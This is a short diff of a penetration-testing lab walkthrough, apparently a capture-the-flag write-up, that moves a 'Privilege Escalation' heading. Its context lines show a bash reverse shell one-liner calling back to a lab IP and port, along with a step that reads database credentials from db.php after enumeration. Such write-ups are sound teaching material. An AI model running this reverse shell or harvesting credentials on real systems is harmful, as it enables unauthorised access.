@@ -378,6 +378,8 @@ bash -c 'exec bash -i >& /dev/tcp/192.168.163.129/4141 0>&1' # в URL кодир
 
 > Success — we have gained shell access.
 
+### Privilege Escalation
+
 > We perform `basic enumeration` and discover a file named `db.php`. Earlier, we learned from the email logs that `administrator credentials are stored in the database`. We read this file and obtain database credentials:
 
 <p align="center">
@@ -395,8 +397,6 @@ ss -tulnp | grep -i listen
 <p align="center">
  <img src="./screenshots/recruit_ss.png" alt="recruit_ss.png" />
 </p>
-
-### Privilege Escalation
 
 > Using the discovered credentials, we connect to the database:
 
